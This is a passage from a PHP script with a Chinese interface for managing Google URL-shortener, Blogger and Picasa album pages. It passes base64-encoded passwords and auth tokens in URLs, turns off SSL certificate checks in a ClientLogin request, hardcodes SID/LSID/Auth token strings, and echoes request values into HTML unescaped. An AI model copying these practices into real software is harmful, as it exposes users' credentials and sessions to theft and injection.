                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=urlshortener&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("urlshortener.list")."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."&authclientLogin=".trim(request("authclientLogin"))?>" target=_self>网址</a> - <?php echo Base64_decode(trim(request("uname")));?> <?php  if (trim($_SESSION["google"]["uname"]) != "" && trim($_SESSION["google"]["pwd"]) != "" && trim($_SESSION["google"]["authclientLogin"]) != "") {?> - <a style="color:#000000;"href="<?php echo scriptpath()."?api=urlshortener&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1&authclientLogin=".trim(request("authclientLogin"));?>" target="_self">退出</a><?php  } ?> ] </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                        	<?php 
                		if ($urlanalytics['urllink'] == '' && $urlanalytics['urlshortlink'] == '' && $urlanalytics['urlkind'] == ''){
                		?>
        <tr class="tdbg">
                <td align="center" id="result">
                        网址分析失败！原因：<?php echo $urlanalytics['errorinfo'];?>
                </td>
        </tr>   
                		<?php       
                        		//echo "<p align=center><script>window.setTimeout(\"history.go(-3)\",".$timeout.");</script></p>";                                
                        		break;
                		}
                		elseif ($urlanalytics['urllink'] != '' && $urlanalytics['urlshortlink'] != '' && $urlanalytics['urlkind'] != ''){
                		?>	
        <tr class="tdbg">
                <td align="center" width=20%>
                        短网址
                </td>
                <td align="center" width=36%>
                        原网址
                </td>
                <td align="center" width=10%>
                        状态
                </td>
                <td align="center" width=15%>
                        <a style="color:#000000" href="<?php echo ScriptPath();?>?api=urlshortener&action=<?php echo encodeuri("urlshortener.create");?>&skin=<?php echo $skincolor;?>&authclientLogin=<?php echo encodeuri(trim(request("authclientLogin")));?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php echo encodeuri(trim(request("pwd")));?>">添加</a> <a style="color:#000000" href="<?php echo ScriptPath();?>?api=urlshortener&action=<?php echo encodeuri("urlshortener.expand");?>&skin=<?php echo $skincolor;?>&authclientLogin=<?php echo encodeuri(trim(request("authclientLogin")));?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php echo encodeuri(trim(request("pwd")));?>">搜索</a>
                </td> 
        </tr>   
        <tr class="tdbg">
                <td align="center">
				<?php 
		                        $urlkind = $urlanalytics['urlkind'];
                		        $urlid = $urlanalytics['urlshortlink'];
                        		$urllongUrl = $urlanalytics['urllink'];
                        		$urlstatus = $urlanalytics['urlstatus'];
                        		echo "<a style=\"color:#000000\" href=\"".$urlid."\" target='_blank'>".$urlid."</a>";
	             		?>
                </td>
                <td align="center">
                        	<?php 
                        		if(strlen($urllongUrl)<='60'){
                        			echo "<a style=\"color:#000000\" href=\"".$urllongUrl."\" target='_blank'>".$urllongUrl."</a>";
                			}
                			else{
                        			echo "<a style=\"color:#000000\" href=\"".$urllongUrl."\" target='_blank'>".substr($urllongUrl,0,60).'...'."</a>";
                			}
                        	?>
                </td>
                <td align="center">
                        	<?php echo $urlstatus?>
                </td>
                <td align="center">
                        分析 <a style="color:#000000" href="<?php echo ScriptPath()."?api=urlshortener&action=".encodeuri("urlshortener.share")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&urllink=".encodeuri($urllink)."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>">分享</a>
                </td>
        </tr>   
                        		<?php       
                		}       
                		?>
</table>                        
                		<?php 
                	}	              
                }
                break;
        case "urlshortener.cento":
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("google");
}
                        //$_SESSION["google"]=array('album' => array('uname' => '', 'pwd' => '', 'authclientLogin' => ''));                                     
                        //session_register("uname"); 
                        $_SESSION["google"]["uname"] = "";      
                        $_SESSION["google"]["pwd"] = "";        
                        $_SESSION["google"]["authclientLogin"] = "";    
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = "";        
                        //session_register("authclientLogin"); 
                        //$_SESSION["authclientLogin"] = "";    
                        redirect(scriptpath()."?api=urlshortener&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=".encodeuri(trim(request("authclientLogin"))));
                        break;
                }
                elseif (trim($_SESSION["google"]["authclientLogin"]) == "" || stripos(trim($_SESSION["google"]["authclientLogin"]),"Bad")){
                        redirect(scriptpath()."?api=urlshortener&skin=".$skincolor."&uname=&pwd=&action="."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=");
                        break;
                }
                $tag->jscento();
?>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=urlshortener&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim( $_SESSION["google"]["uname"] ))."&pwd=".encodeuri(trim( $_SESSION["google"]["pwd"] ))."&skin=".$skincolor."&action=".encodeuri(trim('urlshortener.list'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."&authclientLogin=".trim($_SESSION["google"]["authclientLogin"])?>" target=_self>网址</a> - <?php echo Base64_decode($_SESSION["google"]["uname"]);?> <?php  if (trim($_SESSION["google"]["uname"]) != "" && trim($_SESSION["google"]["pwd"]) != "" && trim($_SESSION["google"]["authclientLogin"]) != "") {?> - <a style="color:#000000;"href="<?php echo scriptpath()."?api=urlshortener&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_SESSION["google"]["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_SESSION["google"]["pwd"])))."&action=".encodeuri(trim('urlshortener.list'))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1&authclientLogin=".trim($_SESSION["google"]["authclientLogin"]);?>" target="_self">退出</a><?php  } ?> ] </td>
        </tr>
</table>

<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>               
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35">
                <td align="center" width="95%">
                        <form action="<?php echo ScriptPath()?>?api=urlshortener&action=<?php echo encodeuri('urlshortener.create');?>&pagesize=<?php  echo encodeuri($pagesize)."&skin=".$skincolor."&authclientLogin=".encodeuri(trim($_SESSION["google"]["authclientLogin"]))."&page=".trim(request("page"))."&uname=".encodeuri(trim($_SESSION["google"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["google"]["pwd"]))."&skin=".$skincolor?>" method="post" name="google">
                        &nbsp网址：<a id="link" href="<?php echo trim(request("u"));?>" target='_blank'>查看连接</a>
                        <input type="hidden" class="text" name="urllink" value="<?php echo trim(request("u"));?>" style="height:20px;width:40%;font-size:11px;" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp验证码：<input maxlength="4" <?php  $style->textarea("#FCFC9D","") ?> name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>   
        </tr>
</table>        
<?php       
                $tag->jscentoload("google","urllink","Url");
                ?>
                <script language="JavaScript" type="text/javascript">
                        document.getElementById('link').href = Url;
                </script>
                <?php 
                break;
        case "digest":
                if (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }
                        redirect(scriptpath()."?api=blogger&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                        $xmlstr = 'SID=DQAAAMgAAACwoBhbJvpTWUVidzccvnpQLemd3sQfmBnwMK6WmqBXZKmfNzEh-ukHDnPtD41gg0gNMiLEuKw4s_gszuFxTalU9kFBKe5U96emac7EYsYrEzE7MBT0DulcB7zNYh89_aIaG22IO__d7PfbJOsm5yTFhNuJD-PunmHTHgS16rDLzqHSZgt16GSfnJRp7_HmtRRGqWnAosqy23guCMFbyVPbrNTbHTOyn7RyFhHAeMvkoXbbdhVGOe44I-iMyuQfQQ59TU9oz8-6mVTFUOyvaT-D '.
                                        'LSID=DQAAAMwAAACWBmAaXg2FmTB0uaDGcaR5Ijs1lCKYP4-IUZriF_tEEYsAOo5cylzgQLJPi5QEIsN3cQaeE7destAUfCIxOkZ8n-RHpTpo1uzvaB8SupwMARIOhLXR8q_Zz1BNQd5TxZwfG2K49Wk8by9wA2kTbcmZ0bqbfjIIroQHy370YRVty7VbzXpkXDQ3dee1nfXDDO8jo9FYIiTYDfwWO7WgxaKNj5SH0-CHqCBuoKhdUpLqDXWohmQ7PVQeVvmEgOWEkrcU17Oa-neDhfxbaQLLeg05 '.
                                        'Auth=DQAAAMoAAACWBmAaXg2FmTB0uaDGcaR5Ijs1lCKYP4-IUZriF_tEEYsAOo5cylzgQLJPi5QEIsN3cQaeE7destAUfCIxOkZ8n-RHpTpo1uzvaB8SupwMARIOhLXR8q_Zz1BNQd5TxZycY5OdxY6cTAeCT8v3PgYHQuTTxgDxRE2TWtZ9nRPKhdtxYmmMTmKtOIwSh7ydRtxsYRSiFy2hHOtCsx9jBMJKmkXppLpHZ1BlSoU1gLrSNFYwbXVbYpEnVi0ebNZPAPzQf0OctGRYy0N1wqlNjhcx ';
                }       
                else{                   
                        $url = "https://www.google.com/accounts/ClientLogin";
                        $data = array(
                                'accountType' => "HOSTED_OR_GOOGLE",
                                'Email' => Base64_decode(trim(request("uname"))),
                                'Passwd' => Base64_decode(trim(request("pwd"))),
                                'source' => "X3193-X3193-1.00",
                                'service' => 'blogger'
                        ); // 数组中的数值不能用自定义函数encodeuri()
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                        curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                        $xmlstr = curl_exec($ch);
                        curl_close($ch);
                }       
                $AuthClientLogin = substr(trim($xmlstr),stripos(trim($xmlstr),"Auth=")+5);
                redirect(ScriptPath()."?api=blogger&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("digest.list")."&authclientLogin=".$AuthClientLogin."&c=".encodeuri(trim(request("c")))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t"))));
                break;
        case "album.list": // action - album.list start
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("google");
}
                        //$_SESSION["google"]=array('album' => array('uname' => '', 'pwd' => '', 'authclientLogin' => ''));                                     
                        //session_register("uname"); 
                        $_SESSION["google"]["uname"] = "";     
                        $_SESSION["google"]["pwd"] = "";       
                        $_SESSION["google"]["authclientLogin"] = "";   
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = "";        
                        //session_register("authclientLogin"); 
                        //$_SESSION["authclientLogin"] = "";    
                        redirect(scriptpath()."?api=picasa&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=".encodeuri(trim(request("authclientLogin"))));
                        break;
                }
                elseif ($_SESSION["google"]["uname"] != "" && $_SESSION["google"]["pwd"] != "" && $_SESSION["google"]["authclientLogin"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == "" && trim(request("authclientLogin")) == ""){
                        redirect(scriptpath()."?api=picasa&skin=".$skincolor."&uname=".encodeuri(trim($_SESSION["google"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["google"]["pwd"]))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=".encodeuri($_SESSION["google"]["authclientLogin"]));
                        break;
                }       
                elseif (trim(request('uname')) != "" && trim(request('pwd')) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("google");
}
                        //$_SESSION["google"]=array('album' => array('uname' => trim(request("uname")), 'pwd' => trim(request("pwd")), 'authclientLogin' => trim(request("authclientLogin"))),'urlshortener' => array('uname' => trim(request("uname")), 'pwd' => trim(request("pwd")), 'authclientLogin' => trim(request("authclientLogin"))));                                        
                        $_SESSION["google"]["uname"] = trim(request("uname")); 
                        $_SESSION["google"]["pwd"] = trim(request("pwd"));     
                        $_SESSION["google"]["authclientLogin"] = trim(request("authclientLogin"));     
                        //session_register("uname"); 
                        //$_SESSION["uname"] = trim(request("uname"));  
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = trim(request("pwd"));      
                        //session_register("authclientLogin"); 
                        //$_SESSION["authclientLogin"] = trim(request("authclientLogin"));
                }       
                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=picasa&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=".encodeuri(trim(request("authclientLogin"))));
                        break;
                }       
                elseif (trim(request("authclientLogin")) == "" || stripos(trim(request("authclientLogin")),"Bad")){
                        redirect(scriptpath()."?api=picasa&skin=".$skincolor."&uname=&pwd=&action="."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=");
                        break;
                }
                $google_album = new google_class();
                $albumlist = $google_album->googlealbumlist(trim(request("authclientLogin")),$page,$pagesize);
                //print_r($albumlist);
                if ($albumlist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $albumlist['length'];
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=<?php echo $strpagesize*($page-1);?>;
 while(eval('document.picasa.chidd'+i))
 {
  eval('document.picasa.chidd'+i).checked = document.picasa.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的文件吗?')) return;
 document.picasa.action='<?php echo ScriptPath()."?api=picasa&action=".encodeuri("album.remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.picasa.submit();
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 : 共 <?php echo $albumlist['length'];?> 条 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=picasa&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("album.list")."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."&authclientLogin=".trim(request("authclientLogin"))?>" target=_self>相册</a> - <?php echo $albumlist['username'];?> <?php  if (trim($_SESSION["google"]["uname"]) != "" && trim($_SESSION["google"]["pwd"]) != "" && trim($_SESSION["google"]["authclientLogin"]) != "") {?> - <a style="color:#000000;"href="<?php echo scriptpath()."?api=picasa&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1&authclientLogin=".trim(request("authclientLogin"));?>" target="_self">退出</a><?php  } ?> ] </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="picasa" method="post" action="">
                <?php 
                $totalitem = $albumlist['length'];
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = $totalitem-1;
                elseif ($totalpage > $page)
                        $endid = floor($strpagesize*($page)-1);
                elseif ($totalpage < $page){
                        $endid = floor($strpagesize*($page-1)-1);
                }                       
                ?>
        <tr class="tdbg">
                <td align="center" width=4%>
                        <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                </td>   
                <td align="center" width=15%>
                        名称
                </td>
                <td align="center" width=15%>
                        图片
                </td>
                <td align="center" width=15%>
                        状态
                </td>
                <td align="center" width=15%>
                        回复
                </td>
                <td align="center" width=30%>
                        <a style="color:#000000" href="<?php echo ScriptPath();?>?api=picasa&action=<?php echo encodeuri("album.edit");?>&skin=<?php echo $skincolor;?>&authclientLogin=<?php echo encodeuri(trim(request("authclientLogin")));?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php echo encodeuri(trim(request("pwd")));?>">添加</a> 搜索 <a style="color:#000000" href="javascript:delitem();">删除</a>
                </td> 
        </tr>   
                <?php 
                for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                        //$objHdd = $objList->item($i);
                        ?>
        <tr class="tdbg">
                <td align="center">
                        <input type="checkbox" name="chidd<?php echo $i;?>" id="chidd<?php echo $i;?>" value="chidd<?php echo $i;?>" />
                </td>   
                <td align="center"%>
                        <?php 
                        $albumid = $albumlist[$i]['albumid'];
                        $albumname = $albumlist[$i]['albumname'];
                        $albumpublished = $albumlist[$i]['albumpublished'];
                        $albumupdated = $albumlist[$i]['albumupdated'];
                        $albumsummary = $albumlist[$i]['albumsummary'];
                        $numphotos = $albumlist[$i]['numphotos'];
                        $albumaccess = $albumlist[$i]['albumaccess'];
                        $albumlocation = $albumlist[$i]['albumlocation'];
                        $albumkeywords = $albumlist[$i]['albumkeywords'];
                        $albumcommentcount = $albumlist[$i]['albumcommentcount'];
                        $albumcommentingEnabled = $albumlist[$i]['albumcommentingEnabled'];
                        $albumlink = $albumlist[$i]['albumlink'];
                        echo "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=picasa&action=".encodeuri("photo.list")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&albumid=".encodeuri($albumid)."&albumname=".encodeuri($albumname)."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."\">".$albumname."</a>";
                ?>
                </td>
                <td align="center">
                        <?php 
                        echo  $numphotos;
                        ?>
                </td>
                <td align="center">
                        <?php echo $albumaccess?>
                </td>
                <td align="center">
                        <?php echo $albumcommentcount;?>
                </td>
                <td align="center">
                        <?php 
                        if (encodeuri(trim(request("u"))) == ""){
                        ?>
                                <a style="color:#000000" href="<?php echo ScriptPath()."?api=picasa&action=".encodeuri("album.edit")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&albumid=".encodeuri($albumid)."&albumtitle=".encodeuri($albumname)."&albumsummary=".encodeuri($albumsummary)."&albumlocation=".encodeuri($albumlocation)."&albumkeywords=".encodeuri($albumkeywords)."&albumaccess=".encodeuri($albumaccess)."&albumcommentingEnabled=".encodeuri($albumcommentingEnabled);?>">编辑</a> <a style="color:#000000" href="<?php echo ScriptPath()."?api=picasa&action=".encodeuri("album.remove")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&albumid=".encodeuri($albumid)."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>">删除</a> <?php  if ($commentingenabled == "ture"){?>回复<?php ;}?> 
                        <?php 
                        }
                        else{
                        ?>
                                <a style="color:#000000" href="<?php echo ScriptPath()."?api=picasa&action=".encodeuri("photo.create")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&albumid=".encodeuri($albumid)."&photopath=".encodeuri(trim(request("u")));?>">收藏到该相册</a> 
                        <?php 
                        
                        }
                        
                        ?>
                </td>
        </tr>   
                <?php 
                }
                ?>
                </td>
        </tr>
</table><table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=picasa&action=".encodeuri(trim(request("action")))."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=picasa&action=".encodeuri(trim(request("action")))."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."'>下一页</a> ";

                				?>
                				<input name="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;" <?php  $style->textarea("#FCFC9D",""); ?>>
												<input type="submit" class="button" name="gotopage" value=" Go ">                 
                				<?php 
                ?>
                </td>
        </tr>   
</table>
<?php 
                //$gotopage->gotopage($totalpage,ScriptPath()."?api=picasa&action=".encodeuri(trim(request("action")))."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
                // action - album.list end
        case "album.edit": // action - album.edit start
                ?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>

<table width="95%" height="25" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left">
                </td>
        </tr>   
</table>        
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=picasa&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("album.list")."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."&authclientLogin=".trim(request("authclientLogin"))?>" target=_self>相册</a> - <?php echo arrmember(split('[@]',base64_decode(trim(request("uname")))),0);?> ] </td>
        </tr>
</table>        
<table width="95%" height="170" align="center" valign="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                <?php 
                if (trim(request("albumid")) == ""){
                ?>
                        <form action="<?php echo ScriptPath();?>?api=picasa&action=<?php echo encodeuri("album.create");?>&pagesize=<?php echo encodeuri($pagesize)."&page=".encodeuri("1")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor;?>&refer=<?php echo encodeuri(trim($_SERVER['HTTP_REFERER']));?>" method="post" name="google">
                <?php 
                }
                else{
                ?>
                        <form action="<?php echo ScriptPath();?>?api=picasa&albumid=<?php echo encodeuri(trim(request("albumid")));?>&action=<?php echo encodeuri("album.create");?>&pagesize=<?php echo encodeuri($pagesize)."&page=".encodeuri("1")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor;?>&refer=<?php echo encodeuri(trim($_SERVER['HTTP_REFERER']));?>" method="post" name="google">
                <?php 
                }
                ?>
        <tr>
                <td align="center" width="30%" height="40">
                        相册名称：
                </td>
                <td align="center" width="70%">
                        <input <?php  $style->textarea("#FCFC9D","");?> style="width:90%;height:22px;" type="text"  id="albumtitle" name="albumtitle" value="<?php echo trim(request("albumtitle"));?>" />
                </td>
        </tr>   
        <tr>
                <td align="center" valign="top">
                        相册简介：
                </td>
                <td align="center">
                        <textarea <?php  $style->textarea("#FCFC9D","");?> style="width=90%; MARGIN-BOTTOM: 5px; OVERFLOW: auto; HEIGHT: 120px;" type="text"  id="albumsummary" name="albumsummary" cols=10 rows=5 wrap="virtual" onpropertychange='google.count.value=google.albumsummary.value.length;'><?php echo trim(request("albumsummary"));?></textarea>
                </td>
        </tr>   
        <tr>
                <td align="center" width="30%" height="40">
                        地理位置：
                </td>
                <td align="center" width="70%">
                        <input <?php  $style->textarea("#FCFC9D","");?> style="width:90%;height:22px;" type="text"  id="albumlocation" name="albumlocation" value="<?php echo trim(request("albumlocation"));?>" />
                </td>
        </tr>   
        <tr>
                <td align="center" width="30%" height="40">
                        关键字（,）：
                </td>
                <td align="center" width="70%">
                        <input <?php  $style->textarea("#FCFC9D","");?> style="width:90%;height:22px;" type="text"  id="albumkeywords" name="albumkeywords" value="<?php echo trim(request("albumkeywords"));?>" />
                </td>
        </tr>   
        <tr>
                <td align="center" height="40">
                        其他相关：
                </td>
                <td align="center">
                        类型：公开<input type="radio" name="albumaccess" value="public" <?php if (trim(request("albumaccess")) == "public"){?>checked<?php }?>>
                        私有<input type="radio" name="albumaccess" value="private" <?php if (trim(request("albumaccess")) == "private"){?>checked<?php }?>>

                        回复：Yes<input type="radio" name="albumcommentingEnabled" value="true" <?php if (trim(request("albumcommentingEnabled")) == "true"){ ?>checked<?php }?>>
                        No<input type="radio" name="albumcommentingEnabled" value="false" <?php if (trim(request("albumcommentingEnabled")) == "false") {?>checked<?php }?>>
